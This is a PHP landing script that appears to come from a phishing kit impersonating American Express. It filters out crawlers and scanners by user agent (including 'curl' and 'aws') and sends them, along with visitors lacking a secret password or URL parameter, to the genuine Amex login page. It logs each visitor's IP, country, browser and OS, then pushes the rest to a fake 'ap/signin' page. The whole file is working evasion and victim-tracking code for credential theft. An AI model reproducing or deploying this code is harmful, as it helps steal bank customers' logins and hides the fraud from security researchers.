<?php
session_start();
require_once("main.php");
require_once("blocker.php");
// require_once("blocker2.php");
require_once("lang.php");
if($config['block_iprange'] == "on") {
  require_once("blacklist.php");
}
if($config['onetime'] == "on") {
  require_once("onetime.php");
}
if (preg_match("/bot|crawler|spider|aws|curl|slurp/", $_SERVER['HTTP_USER_AGENT'])) {
        tulis_file("result/block_bot.txt","$time | $ip | $countryname | $br | $os | BLOCKED BY BASIC BOT");
        tulis_file("result/total_bot.txt","$ip (Site Password)");
        header("location: https://www.americanexpress.com/en-us/account/login");
        exit();
}
if($config['site_pass_on'] == "on") {
    $secret = md5($ip);
    $password = $_POST[$secret];
    $mypass = md5($config['site_password']);
    if(!isset($password)) {
        tulis_file("result/block_bot.txt","BLOCKED SITE PASSWORD || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        tulis_file("result/total_bot.txt","$ip (Site Password)");
header("location: https://www.americanexpress.com/en-us/account/login");
      exit();
    }else{
        $_SESSION['key'] = $key;
    }
}

if($config['site_param_on'] == "on") {
    $secret = $config['site_parameter'];
    $password = $_GET[$secret];
    if(!isset($password)) {
        tulis_file("result/block_bot.txt","BLOCKED SITE PARAM || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        tulis_file("result/total_bot.txt","$ip (Site Parameter)");
        header('HTTP/1.0 403 Forbidden');
header("location: https://www.americanexpress.com/en-us/account/login");
        exit();
    }else{
        $_SESSION['key'] = $key;
    }
}
tulis_file("result/log_visitor.txt","| $time | $ip | $countryname | $br | $os");
tulis_file("result/total_click.txt","$ip");
echo "<script type='text/javascript'>window.top.location='ap/signin?session=".$key."';</script>";